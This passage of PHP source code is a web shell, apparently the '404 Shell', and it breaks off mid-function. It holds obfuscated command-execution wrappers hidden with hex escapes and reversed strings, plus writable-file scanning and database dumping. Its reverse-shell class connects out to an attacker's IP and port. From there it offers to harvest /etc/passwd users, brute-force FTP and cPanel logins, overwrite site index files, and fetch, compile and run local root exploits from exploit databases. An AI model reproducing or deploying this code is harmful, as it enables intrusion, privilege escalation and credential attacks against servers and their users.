        unset($pathdb[$num - 1], $pathdb[$num - 2]);
    }
    $uppath = implode('/', $pathdb) . '/';
    $uppath = str_replace('//', '/', $uppath);
    return $uppath;
}
function getcfg($varname)
{
    $result = get_cfg_var($varname);
    if ($result == 0) {
        return 'No';
    } elseif ($result == 1) {
        return 'Yes';
    } else {
        return $result;
    }
}
function getfun($funName)
{
$sf = "suhosin_fun\x63_exi\x73ts";
    return (false !== $sf($funName)) ? 'Yes' : 'No';
}
function getext($file)
{
    $info = pathinfo($file);
    return $info['extension'];
}
function GetWDirList($dir)
{
    global $dirdata, $j, $nowpath;
    !$j && $j = 1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $f = str_replace('//', '/', $dir . '/' . $file);
            if ($file != '.' && $file != '..' && is_dir($f)) {
                if (is_writable($f)) {
                    $dirdata[$j]['filename']    = str_replace($nowpath, '', $f);
                    $dirdata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
                    $dirdata[$j]['dirchmod']    = getChmod($f);
                    $dirdata[$j]['dirperm']     = PermsColor($f);
                    $dirdata[$j]['dirlink']     = $dir;
                    $dirdata[$j]['server_link'] = $f;
                    $j++;
                }
                GetWDirList($f);
            }
        }
        closedir($dh);
        clearstatcache();
        return $dirdata;
    } else {
        return array();
    }
}
function GetWFileList($dir)
{
    global $filedata, $j, $nowpath, $writabledb;
    !$j && $j = 1;
    if ($dh = opendir($dir)) {
        while ($file = readdir($dh)) {
            $ext = getext($file);
            $f   = str_replace('//', '/', $dir . '/' . $file);
            if ($file != '.' && $file != '..' && is_dir($f)) {
                GetWFileList($f);
            } elseif ($file != '.' && $file != '..' && is_file($f) && in_array($ext, explode(',', $writabledb))) {
                if (is_writable($f)) {
                    $filedata[$j]['filename']    = str_replace($nowpath, '', $f);
                    $filedata[$j]['size']        = sizecount(@filesize($f));
                    $filedata[$j]['mtime']       = @date('Y-m-d H:i:s', filemtime($f));
                    $filedata[$j]['filechmod']   = getChmod($f);
                    $filedata[$j]['fileperm']    = PermsColor($f);
                    $filedata[$j]['fileowner']   = getUser($f);
                    $filedata[$j]['dirlink']     = $dir;
                    $filedata[$j]['server_link'] = $f;
                    $j++;
                }
            }
        }
        closedir($dh);
        clearstatcache();
        return $filedata;
    } else {
        return array();
    }
}
function qy($sql)
{
    global $mysqllink;
    $res = $error = '';
    if (!$res = @mysql_query($sql, $mysqllink)) {
        return 0;
    } else if (is_resource($res)) {
        return 1;
    } else {
        return 2;
    }
    return 0;
}
function q($sql)
{
    global $mysqllink;
    return @mysql_query($sql, $mysqllink);
}
function fr($qy)
{
    mysql_free_result($qy);
}
//function sizecount2($fileSize) {
//$size = sprintf("%u",$fileSize);
//if($size == 0) {
//return '0 Bytes';
//}
//$sizename = array(' Bytes',' KB',' MB',' GB',' TB',' PB',' EB',' ZB',' YB');
//return round( $size / pow(1024,($i = floor(log($size,1024)))),2) .$sizename[$i];
//}
function sizecount($bytes)
{
    $labels = array(
        'Bytes',
        'KB',
        'MB',
        'GB',
        'TB',
        'PB',
        'EB',
        'YB'
    );
    for ($x = 0; $bytes >= 1024 && $x < (count($labels) - 1); $bytes /= 1024, $x++);
    return (round($bytes, 2) . ' ' . $labels[$x]);
}
function sqldumptable($table, $fp = 0)
{
    global $mysqllink;
    $tabledump = "DROP TABLE IF EXISTS \x60$table\x60;\n";
    $res       = q("SHOW CREATE TABLE $table");
    $create    = mysql_fetch_row($res);
    $tabledump .= $create[1] . ";\n\n";
    $feather = strrev("rwf") . "ite";
    if ($fp) {
        $feather($fp, $tabledump);
    } else {
        echo $tabledump;
    }
    $tabledump = '';
    $rows      = q("SELECT * FROM \x60$table\x60");
    while ($row = mysql_fetch_assoc($rows)) {
        foreach ($row as $k => $v) {
            $row[$k] = "'" . @mysql_real_escape_string($v) . "'";
        }
        $tabledump = "INSERT INTO \x60" . $table . "\x60 VALUES (" . implode(", ", $row) . ');' . "\n";
        if ($fp) {
            $feather($fp, $tabledump);
        } else {
            echo $tabledump;
        }
    }
    $feather($fp, "\n\n");
    fr($rows);
}
function p($str)
{
    echo $str . "\n";
}
function tbhead($id = ""){
    p('<table width="100%"' . ($id != "" ? ' id="' . $id . '"' : "") . ' border="0" cellpadding="4" cellspacing="0">');
}
function tbfoot()
{
    p('</table>');
}
function makehide($name, $value = '')
{
    p("<input id=\"$name\" type=\"hidden\" name=\"$name\" value=\"$value\" />");
}
function makeinput($arg = array())
{
    $arg['size']  = $arg['size'] > 0 ? "size=\"$arg[size]\"" : "size=\"100\"";
    $arg['extra'] = $arg['extra'] ? $arg['extra'] : '';
    !$arg['type'] && $arg['type'] = 'text';
    $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
    $arg['class'] = $arg['class'] ? $arg['class'] : 'input';
    $hf           = "";
    if ($arg['type'] == "text" || $arg['type'] == "password") {
        $hf = "onmouseover=\"this.focus();\" ";
    }
    if ($arg['newline']) {
        p("<p>$arg[title]<input " . $hf . "class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] /></p>");
    } else {
        p("$arg[title]<input " . $hf . "class=\"$arg[class]\" name=\"$arg[name]\" id=\"$arg[name]\" value=\"$arg[value]\" type=\"$arg[type]\" $arg[size] $arg[extra] />");
    }
}
function makeselect($arg = array())
{
    if ($arg['onchange']) {
        $onchange = 'onchange="' . $arg['onchange'] . '"';
    }
    $arg['title'] = $arg['title'] ? $arg['title'] : '';
    if ($arg['newline'])
        p('<p>');
    p("$arg[title] <select class=\"input\" id=\"$arg[name]\" name=\"$arg[name]\" $onchange>");
    if (is_array($arg['option'])) {
        if ($arg['nokey']) {
            foreach ($arg['option'] as $value) {
                if ($arg['selected'] == $value) {
                    p("<option value=\"$value\" selected>$value</option>");
                } else {
                    p("<option value=\"$value\">$value</option>");
                }
            }
        } else {
            foreach ($arg['option'] as $key => $value) {
                if ($arg['selected'] == $key) {
                    p("<option value=\"$key\" selected>$value</option>");
                } else {
                    p("<option value=\"$key\">$value</option>");
                }
            }
        }
    }
    p("</select>");
    if ($arg['newline'])
        p('</p>');
}
function formhead($arg = array())
{
    global $self;
    !$arg['method'] && $arg['method'] = 'post';
    !$arg['action'] && $arg['action'] = $self;
    $arg['target'] = $arg['target'] ? "target=\"$arg[target]\"" : '';
    !$arg['name'] && $arg['name'] = 'form1';
    p("<form name=\"$arg[name]\" id=\"$arg[name]\" action=\"$arg[action]\" onSubmit=\"window.onbeforeunload = null;\" method=\"$arg[method]\" $arg[target]>");
    if ($arg['title']) {
        p('<h2>' . $arg['title'] . '</h2>');
    }
}
function maketext($arg = array())
{
    !$arg['cols'] && $arg['cols'] = 100;
    !$arg['rows'] && $arg['rows'] = 25;
    $arg['title'] = $arg['title'] ? $arg['title'] . '<br />' : '';
    if ($arg['dataeditor'] != "") {
        p("<p>$arg[title]<textarea onmouseover=\"this.focus();\" class=\"area\" id=\"$arg[name]\" data-editor=\"$arg[dataeditor]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>" . ($arg['value']) . "</textarea></p>");
        
    } else {
        p("<p>$arg[title]<textarea onmouseover=\"this.focus();\" class=\"area\" id=\"$arg[name]\" name=\"$arg[name]\" cols=\"$arg[cols]\" rows=\"$arg[rows]\" $arg[extra]>" . ($arg['value']) . "</textarea></p>");
    }
}
function formfooter($name = '')
{
    !$name && $name = 'submit';
    p('<p><input class="bt" name="' . $name . '" id="' . $name . '" type="submit" value="Submit"></p>');
    p('</form>');
}
function goback()
{
    global $self, $nowpath;
    p('<form action="' . $self . '" method="post" onSubmit="window.onbeforeunload = null;"><input type="hidden" name="action" value="file" /><input type="hidden" name="dir" value="' . $nowpath . '" /><p><input class="bt" type="submit" name="buttonclick" value="Go back..."></p></form>');
}
function formfoot()
{
    p('</form>');
}
function encode_pass($pass)
{
    //$p2ass = md5($pass);
    //$p2ass = md5($pass);
    //$p2ass = md5($pass);
    return md5(md5(md5($pass)));
}
function all_xbox($command)
{
$prco = "proc_op\x65n";
$pt = "p\x61\x73\x73th\x72u";
$sf = "suhosin_fun\x63_exi\x73ts";
    $output = "";
    if ($sf(strrev('xe') . "e\x63")) {
        $noplaystation = strrev('xe') . "e\x63";
        $noplaystation($command, $output);
        $output = join("\n", $output);
    }
    
    else if ($sf(strrev('hs') . "e\x6C\x6C\x5F\x65\x78ec")) {
        $microsopht = strrev('hs') . "e\x6C\x6C\x5F\x65\x78ec";
        $output = $microsopht($command);
    }
    
    else if ($sf(strrev('op') . 'pen')) {
        $door = strrev('op') . 'pen';
        $garage = strrev('cp') . 'lose';
        $handle = $door($command, "r"); // Open the command pipe for reading
        if (is_resource($handle)) {
            if ($sf("f\x72e" . strrev('da')) && $sf(strrev('ef') . 'of')) {
                $books = "f\x72e" . strrev('da');
                $screwyou = strrev('ef') . 'of';
                while (!$screwyou($handle)) {
                    $output .= $books($handle, 512);
                }
            } else if ($sf('f' . strrev("eg") . 'ts') && $sf(strrev('ef') . 'of')) {
                $store = 'f' . strrev("eg") . 'ts';
                $screwyou = strrev('ef') . 'of';
                while (!$screwyou($handle)) {
                    $output .= $store($handle, 512);
                }
            }
        }
        $garage($handle);
    }
    
    
    else if ($sf(strrev("\x79s") . 'stem')) {
        ob_start(); //start output buffering
        $resolution = strrev("\x79s") . 'stem';
        $resolution($command);
        $output = ob_get_contents(); // Get the ouput 
        ob_end_clean(); // Stop output buffering
    }
    
    else if ($sf("p\x61\x73\x73th\x72u")) {
        ob_start(); //start output buffering
        $pt($command);
        $output = ob_get_contents(); // Get the ouput 
        ob_end_clean(); // Stop output buffering            
    }
    
    else if ($sf("pr\x6F\x63\x5Fop\x65n")) {
        $descriptorspec = array(
            1 => array(
                "pi\x70\x65",
                "w"
            ) // stdout is a pipe that the child will write to
        );
        $handle         = $prco($command, $descriptorspec, $pipes); // This will return the output to an array 'pipes'
        $garage = strrev('cp') . 'lose';
        if (is_resource($handle)) {
            if ($sf("f\x72e" . strrev('da')) && $sf(strrev('ef') . 'of')) {
                $books = "f\x72e" . strrev('da');
                $screwyou = strrev('ef') . 'of';
                while (!$screwyou($pipes[1])) {
                    $output .= $books($pipes[1], 512);
                }
            } else if ($sf(strrev('ef') . 'of') && $sf(strrev('ef') . 'of')) {
                $screwyou = strrev('ef') . 'of';
                $store = 'f' . strrev("eg") . 'ts';
                while (!$screwyou($pipes[1])) {
                    $output .= $store($pipes[1], 512);
                }
            }
        }
        $garage($handle);
    }
    return (htmlspecialchars($output));
    
}
function recursive_str_ireplace($replacethis, $withthis, $inthis)
{
    while (1 == 1) {
        $inthis = str_ireplace($replacethis, $withthis, $inthis);
        if (stristr($inthis, $replacethis) === FALSE) {
            RETURN $inthis;
        }
    }
    RETURN $inthis;
}
function recursive_str_replace($replacethis, $withthis, $inthis)
{
    while (1 == 1) {
        $inthis = str_replace($replacethis, $withthis, $inthis);
        if (strstr($inthis, $replacethis) === FALSE) {
            RETURN $inthis;
        }
    }
    RETURN $inthis;
}
function mailAttachmentHeader($message){
    $b = strrev("edocne_4"."6esab");
    $mime_boundary = md5(time());
    $xMessage      = "Content-Type: multipart/mixed; boundary=\"" . $mime_boundary . "\"\r\n\r\n";
    $xMessage .= "--" . $mime_boundary . "\r\n";
    $xMessage .= "Content-Type: text/plain; charset=\"iso-8859-1\"\r\n";
    $xMessage .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $xMessage .= $message . "\r\n\r\n";
    for ($i = 0; $i < count($_FILES['file']['name']); $i++) {
        if ($_FILES['file']['name'][$i] != "") {
            $xMessage .= "--" . $mime_boundary . "\r\n";
            $xMessage .= "Content-Type: " . $_FILES['file']['type'][$i] . "; name=\"" . $_FILES['file']['name'][$i] . "\"\r\n"; //"Content-Type: application/octet-stream; name=\"".$_FILES['file']['name']."\"\r\n";
            $xMessage .= "Content-Transfer-Encoding: ba\x73\x65\x364\r\n";
            $xMessage .= "Content-Disposition: attachment; filename=\"" . $_FILES['file']['name'][$i] . "\"\r\n\r\n";
            $content = file_get_contents($_FILES['file']['tmp_name'][$i]);
            $xMessage .= chunk_split($b($content));
            $xMessage .= "\r\n\r\n";
        }
    }
    $xMessage .= "--" . $mime_boundary . "--\r\n\r\n";
    return $xMessage;
}
function generateRandomString($length = 10)
{
    $characters   = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}
function wsoEx($in)
{
	$pt = "p\x61\x73\x73th\x72u";
	$sf = "suhosin_fun\x63_exi\x73ts";
    $out = '';
    $door = strrev('op') . 'pen';
    $garage = strrev('cp') . 'lose';
    if ($sf("\x65x\x65c")) {
        $nintendo = "\x65x\x65c";
        @$nintendo($in, $out);
        $out = @join("\n", $out);
    } elseif ($sf("p\x61\x73\x73th\x72u")) {
        ob_start();
        @$pt($in);
        $out = ob_get_clean();
    } elseif ($sf(strrev("\x79s") . 'stem')) {
        $resolution = strrev("\x79s") . 'stem';
        ob_start();
        @$resolution($in);
        $out = ob_get_clean();
    } elseif ($sf("shell_\x65x\x65c")) {
        $tv = "shell_\x65x\x65c";
        $out = $tv($in);
    } elseif (is_resource($f = @$door($in, "r"))) {
        $out = "";
        $books = "f\x72e" . strrev('da');
        $screwyou = strrev('ef') . 'of';
        while (!@$screwyou($f))
            $out .= $books($f, 1024);
        $garage($f);
    }
    return $out;
}
function clang($ext)
{
    switch (strtolower($ext)) {
        case "php":
            return "php";
            break;
        case "htm":
            return "html";
            break;
        case "html":
            return "html";
            break;
        case "js":
            return "javascript";
            break;
        case "py":
            return "python";
            break;
        case "rb":
            return "ruby";
            break;
        default:
            return "text";
            break;
            
    }
}
function get_data($url)
{
    $ch      = curl_init();
    $corral = "\x63u\x72\x6C\x5Fc\x6C\x6Fs\x65";
    $corralfish = "\x63u\x72l_e" . strrev("cex");
    $timeout = 5;
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
    $data = $corralfish($ch);
    $corral($ch);
    return $data;
}
function geterrorpage()
{
    $corral = "\x63u\x72\x6C\x5Fc\x6C\x6Fs\x65";
    $corralfish = "\x63u\x72l_e" . strrev("cex");
	$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
    $u           = "/" . substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyz"), 0, 26);
    $ux          = "http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $u;
    $data        = file_get_contents($ux, false, stream_context_create(array(
        'http' => array(
            'follow_location' => true,
            'ignore_errors' => true
        )
    )));
    $redirecturl = str_replace("Location: ", "", $http_response_header[3]);
    if (!$data) {
        $ch      = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, $ux);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $data        = $corralfish($ch);
        $redirecturl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);
        $corral($ch);
    }
    $data      = str_replace($u, $_SERVER['PHP_SELF'], $data);
    $linktypes = array(
        "href",
        "src",
        "action"
    );
    foreach ($linktypes as $linktype) {
        $prgma("/" . $linktype . "=([\"\'])(.*?)([\"\'])/i", $data, $matches);
        for ($i = 0; $i < count($matches[0]); ++$i) {
            $href = $matches[2][$i];
            if (0 === strpos($href, 'http') || 0 === strpos($href, 'data:') || 0 === strpos($href, '#') || 0 === strpos($href, 'javascript:') || 0 === strpos($href, '//')) {
                //Valid Links
            } else {
                $data = str_replace($matches[1][$i] . $matches[2][$i] . $matches[3][$i], $matches[1][$i] . dirname($redirecturl) . "/" . $matches[2][$i] . $matches[3][$i], $data);
            }
        }
    }
    //Now for CSS images
    $prgma("/url\(([\"\'])(.*?)([\"\'])\)/i", $data, $matches);
    for ($i = 0; $i < count($matches[0]); ++$i) {
        $href = $matches[2][$i];
        if (0 === strpos($href, 'http') || 0 === strpos($href, '//')) {
            //Valid Links
        } else {
            $data = str_replace($matches[1][$i] . $matches[2][$i] . $matches[3][$i], $matches[1][$i] . dirname($redirecturl) . "/" . $matches[2][$i] . $matches[3][$i], $data);
        }
    }
    return $data;
}
function strbool($value)
{
    return $value ? 'true' : 'false';
}
class DB_MySQL  {

	var $querycount = 0;
	var $link;
	var $charsetdb = array();
	var $charset = '';

	function connect($dbhost, $dbuser, $dbpass, $dbname='') {
		@ini_set('mysql.connect_timeout', 5);
		if(!$this->link = @mysql_connect($dbhost, $dbuser, $dbpass, 1)) {
			$this->halt('Can not connect to MySQL server');
		}
		if($this->version() > '4.1') {
			$this->setcharset($this->charset);
		}
		$dbname && mysql_select_db($dbname, $this->link);
	}
	function suhosin_func_exists($func) {
    if (extension_loaded('suhosin')) {
        $suhosin = @ini_get("suhosin.ex\x65cutor.func.bl\x61cklist");
        if (empty($suhosin) == false) {
            $suhosin = explode(',', $suhosin);
            $suhosin = array_map('trim', $suhosin);
            $suhosin = array_map('strtolower', $suhosin);
            return (function_exists($func) == true && array_search($func, $suhosin) === false);
        }
    }
    return function_exists($func);
}
	function setcharset($charset) {
	$sf = "suhosin_fun\x63_exi\x73ts";
		if ($charset && $this->charsetdb[$charset]) {
			if($sf('mysql_set_charset')) {
				mysql_set_charset($this->charsetdb[$charset], $this->link);
			} else {
				$this->query("SET character_set_connection='".$this->charsetdb[$charset]."', character_set_results='".$this->charsetdb[$charset]."', character_set_client=binary");
			}
		}
	}
	function select_db($dbname) {
		return mysql_select_db($dbname, $this->link);
	}
	function geterrdesc() {
		return (($this->link) ? mysql_error($this->link) : mysql_error());
	}
	function geterrno() {
		return intval(($this->link) ? mysql_errno($this->link) : mysql_errno());
	}
	function fetch($query, $result_type = MYSQL_ASSOC) { //MYSQL_NUM
		return mysql_fetch_array($query, $result_type);
	}
	function query($sql) {
		//echo '<p style="color:#f00;">'.$sql.'</p>';
		if(!($query = mysql_query($sql, $this->link))) {
			$this->halt('MySQL Query Error', $sql);
		}
		$this->querycount++;
		return $query;
	}
	function query_res($sql) { 
		$res = '';
		if(!$res = mysql_query($sql, $this->link)) { 
			$res = 0;
		} else if(is_resource($res)) {
			$res = 1; 
		} else {
			$res = 2;
		}
		$this->querycount++;
		return $res;
	}
	function num_rows($query) {
		$query = mysql_num_rows($query);
		return $query;
	}
	function num_fields($query) {
		$query = mysql_num_fields($query);
		return $query;
	}
	function affected_rows() {
		return mysql_affected_rows($this->link);
	}
	function result($query, $row) {
		$query = mysql_result($query, $row);
		return $query;
	}	
	function free_result($query) {
		$query = mysql_free_result($query);
		return $query;
	}
	function version() {
		return mysql_get_server_info($this->link);
	}
	function close() {
		return mysql_close($this->link);
	}
	function halt($msg =''){
		echo "<h2>".htmlspecialchars($msg)."</h2>\n";
		echo "<p class=\"b\">MySQL Error Description: ".htmlspecialchars($this->geterrdesc())."</p>\n";
		echo "<p class=\"b\">MySQL error number: ".$this->geterrno()."</p>\n";
		exit;
	}
	function get_fields_meta($result) {
		$fields = array();
		$num_fields = $this->num_fields($result);
		for ($i = 0; $i < $num_fields; $i++) {
			$field = mysql_fetch_field($result, $i);
			$fields[] = $field;
		}
		return $fields;
	}
	function sqlAddSlashes($s = ''){
		$s = str_replace('\\', '\\\\', $s);
		$s = str_replace('\'', '\'\'', $s);
		return $s;
	}
	function sqldump($table, $fp=0) {
	    $feather = strrev("rwf") . "ite";
		$crlf = (IS_WIN ? "\r\n" : "\n");
		$search = array("\x00", "\x0a", "\x0d", "\x1a"); //\x08\\x09, not required
		$replace = array('\0', '\n', '\r', '\Z');

		if (isset($this->charset) && isset($this->charsetdb[$this->charset])) {
			$set_names = $this->charsetdb[$this->charset];
		} else {
			$set_names = $this->charsetdb['utf-8'];
		}
		$tabledump = 'SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";'.$crlf.$crlf;
		$tabledump .= '/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;'.$crlf
			   . '/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;'.$crlf
			   . '/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;'.$crlf
			   . '/*!40101 SET NAMES ' . $set_names . ' */;'.$crlf.$crlf;

		$tabledump .= "DROP TABLE IF EXISTS \x60$table\x60;".$crlf;
		$res = $this->query("SHOW CREATE TABLE $table");
		$create = $this->fetch($res, MYSQL_NUM);
		$tabledump .= $create[1].';'.$crlf.$crlf;
		if (strpos($tabledump, "(\r\n ")) {
			$tabledump = str_replace("\r\n", $crlf, $tabledump);
		} elseif (strpos($tabledump, "(\n ")) {
			$tabledump = str_replace("\n", $crlf, $tabledump);
		} elseif (strpos($tabledump, "(\r ")) {
			$tabledump = str_replace("\r", $crlf, $tabledump);
		}
		unset($create);

		if ($fp) {
			$feather($fp,$tabledump);
		} else {
			echo $tabledump;
		}
		$tabledump = '';
		$rows = $this->query("SELECT * FROM $table");
		$fields_cnt = $this->num_fields($rows);
		$fields_meta = $this->get_fields_meta($rows);

		while ($row = $this->fetch($rows, MYSQL_NUM)) {
			for ($j = 0; $j < $fields_cnt; $j++) {
				if (!isset($row[$j]) || is_null($row[$j])) {
					$values[] = 'NULL';
				} elseif ($fields_meta[$j]->numeric && $fields_meta[$j]->type != 'timestamp' && !$fields_meta[$j]->blob) {
					$values[] = $row[$j];
				} elseif ($fields_meta[$j]->blob) {
					if (empty($row[$j]) && $row[$j] != '0') {
						$values[] = '\'\'';
					} else {
						$values[] = '0x'.bin2hex($row[$j]);
					}
				} else {
					$values[] = '\''.str_replace($search, $replace, $this->sqlAddSlashes($row[$j])).'\'';
				}
			}
			$tabledump = "INSERT INTO \x60".$table."\x60 VALUES(".implode(', ', $values).');'.$crlf;
			unset($values);
			if ($fp) {
				$feather($fp,$tabledump);
			} else {
				echo $tabledump;
			}
		}
		$this->free_result($rows);
	}
}
class BC
{
  private $your_ip;
  private $your_port;
  private $server_ip;
  private $timeout;
  private $homefolder;
  public function __construct($yip,$yp,$sip,$t)
  {
  $this->your_ip   = $yip;
  $this->your_port = $yp;
  $this->server_ip = $sip;
  $this->timeout   = $t;
  ob_flush(); flush();
  $this->createshell();
  }
  private function createshell()
  {
  	$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
$shellfish = "shell_\x65\x78\x65c";
$feather = strrev("rwf") . "ite";
  $socket = @fsockopen($this->your_ip,$this->your_port,$errno,$errstr,$this->timeout) or die("<font color='red'>Unfortunately could not spawn shell</font>\n<br>");
  print("<font color='green'>Shell process opened to <strong>$this->server_ip</strong> > <strong>$this->your_ip:$this->your_port</strong></font>\n<br>");
  ob_flush(); flush();
  $feather($socket,"=============================================================");
  $feather($socket,"
 _  _    ___  _  _     ____  _          _ _ 
| || |  / _ \| || |   / ___|| |__   ___| | |
| || |_| | | | || |_  \___ \| '_ \ / _ \ | |
|__   _| |_| |__   _|  ___) | | | |  __/ | |
   |_|  \___/   |_|   |____/|_| |_|\___|_|_|
                                            \n");
  $feather($socket,"=============================================================\n");
  $feather($socket,"# Information:\n");
  $feather($socket,"-------------------------------------------------------------\n");
  $feather($socket,"uname -a: ".@$shellfish("uname -a")."\n");
  $feather($socket,"whoami: ".@$shellfish("whoami")."\n");
  $feather($socket,"id: ".@$shellfish("id")."\n");
  $feather($socket,"pwd: ".@$shellfish("pwd")."\n");
  $feather($socket,"# Options:\n");
  $feather($socket,"- exploit = Automatic Search & Download & Run a local root exploit which matches with kernel release\n");
  $feather($socket,"- grabusr = Grab users from /etc/passwd and save into a file ( users )\n");
  $feather($socket,"- domains = List domains from /var/named\n");
  $feather($socket,"- getf    = Find and grab the name given file from all public_html dirs ( only works with /home/USER/public_html servers )\n");
  $feather($socket,"- catln   = Cat file with ln -s method\n");
  $feather($socket,"- index    = Try copy the name given file to all public_html dirs ( only works with /home/USER/public_html servers )\n");
  $feather($socket,"- home    = Change dir into home folder\n");
  $feather($socket,"- ftp    = Performs ftp brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
  $feather($socket,"- cpanel  = Performs cpanel brute-force attack to all users from /etc/passwd ( only works with /home/USER/public_html servers )\n");
  $this->homefolder = trim(@$shellfish("pwd"));
  $feather($socket,"-------------------------------------------------------------\n");
  $result= @$shellfish("whoami");
  $feather($socket,$result);
  print "<font color='green'>Command whoami;</font>\n";
  print $result;
  ob_flush(); flush();
  $prgm("#([0-9]).([0-9]).([0-9]+)-([a-z0-9]+)#si",@$shellfish("uname -r"),$version);
  $version1 = $version[0];
  $version2 = $version[1].".".$version[2].".".$version[3];
  print "<pre>";
  while(1)
  {
  $enter = fgets($socket);
  if($prgm('#exit#',$enter)){$feather($socket,"Process closed\n");exit("Process closed");$pixel($socket);}
  if($prgm('#exploit#',$enter)){$this->search($version1,$socket);$this->search($version2,$socket);}
  if($prgm('#grabusr#',$enter)){$this->grab_users($socket);}
  if($prgm('#catln (.+)#',$enter,$file)){$this->catln($file[1],$socket);}
  if($prgm('#index (.+)#',$enter,$file)){$this->index($file[1],$socket);}
  if($prgm('#getf (.+)#',$enter,$file)){$this->getf($file[1],$socket);}
  if($prgm('#ftp (.+)#',$enter,$file)){$this->ftp($file[1],$socket);}
  if($prgm('#cpanel (.+)#',$enter,$file)){$this->cpanel($file[1],$socket);}
  if($prgm('#domains#',$enter)){$this->domains($socket);}
  if(eregi('home',$enter)){chdir($this->homefolder);}
  if(strpos($enter,'cd ..')){
  $curr = getcwd();
  $explode = explode("/",$curr);
  $c = count($explode);
  unset($explode[$c-1]);
  $explode = array_values(array_filter($explode));
  $path   = implode("/",$explode);
  $path   = "/".$path;
  if(!chdir($path)){$feather($socket,"Can't chdir into $path : Permission denied\n");}
  }
  elseif($prgm('#cd (.+)#',$enter,$dir)){
  $curr = getcwd();
  if($prgm("#\/#si",$dir[1]))
  {
  if(!chdir($dir[1])){$feather($socket,"Can't chdir into $dir[1] : Permission denied\n");}
  }
  else
  {
  if(!chdir($curr."/".$dir[1])){$feather($socket,"Can't chdir into $curr/$dir[1] : Permission denied\n");}
  }
  
  }
  $result= @$shellfish(trim($enter));
  $feather($socket,$result);
  print "<font color='green'>Command ".trim($enter).";</font>\n";
  print $result;
  ob_flush(); flush();
  }
  $elevator = strrev("cf") . "lose";
  print "</pre>";
  $elevator($socket);
  }
  private function search($version,$socket)
  {
		$prgm = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68";
		$prgma = "\x70\x72\x65\x67\x5f\x6d\x61\x74\x63\x68\x5f\x61\x6c\x6c";
$shellfish = "shell_\x65\x78\x65c";
$feather = strrev("rwf") . "ite";
    $feather($socket,"Release: $version\n");
    print("Release: $version\n<br>");
    ob_flush();flush();
    $feather($socket,"Searching Exploit-DB for local root exploits..\n");
    print("Searching Exploit-DB for local root exploits..\n<br>");
    $exploit_db = $this->curl("http://www.exploit-db.com/search/?action=search&filter_description=$version");
    if($prgm('/No results/si',$exploit_db))
    {
    $feather($socket,"Not found any exploits\n");
    print("Not found any exploits\n<br>");
    ob_flush();flush();
    }
    else
    {
    $feather($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    $prgma('#<td class="list_explot_description">(.*?)<\/td>#si',$exploit_db,$list);
    foreach($list[1] as $listx)
    {
    $prgm('#<a  href="(.*?)">(.*?)<\/a>#si',$listx,$exploit);
    $feather($socket,"[+] ".$exploit[2]."\n");
    print("[+] ".$exploit[2]."\n<br>");
    $feather($socket,"Trying pwn this server with this exploit\n");
    print("Trying pwn this server with this exploit\n<br>");
    $feather($socket,"Downloading => ".$exploit[1]."\n");
    print("Downloading => ".$exploit[1]."\n<br>");
    ob_flush();flush();
    $download = $this->download($exploit[1]);
    if($download != false)
    {
    $feather($socket,"File downloaded saved as $download\n");
    print("File downloaded saved as $download\n<br>");
    $feather($socket,"Trying compile to $download file\n");
    print("Trying compile to $download file\n<br>");
    ob_flush();flush();
    $withoutc = str_replace(".c","",$download);
    @$shellfish("gcc $download -o $withoutc");
    if(file_exists($withoutc))
    {
    $feather($socket,"File compiled\n");
    print("File compiled\n<br>");
    $feather($socket,"Setting chmod options\n");
    print("Setting chmod options\n<br>");
    @$shellfish("chmod +x $withoutc");
    $feather($socket,"Running exploit..!\n");
    print("Running exploit..!\n<br>");
    ob_flush();flush();
    @$shellfish("./$withoutc");
    }
    else
    {
    $feather($socket,"File doesn't compile\n");
    print("File doesn't compile\n<br>");
    ob_flush();flush();
    }
    
    }
    else
    {
    $feather($socket,"File doesn't download\n");
    print("File doesn't download\n<br>");
    ob_flush();flush();
    }
    
    }
    $feather($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    }
    $feather($socket,"Searching 1337day for local root exploits..\n");
    print("Searching 1337day for local root exploits..\n<br>");
    ob_flush();flush();
    $day1337 = $this->curl("http://www.1337day.com/search","agree=Ok&dong=$version&submit_search=Submit");
    $prgma("#<a href='/exploit/description/(.*?)'  >(.*?)<\/a>#si",$day1337,$exploits);
    if($exploits[1])
    {
    $feather($socket,"==================== Possible Exploits =====================\n");
    print("==================== Possible Exploits =====================\n<br>");
    ob_flush();flush();
    foreach($exploits[1] as $i => $exploit)
    {
    $feather($socket,"[+] ".$exploits[2][$i]."\n");
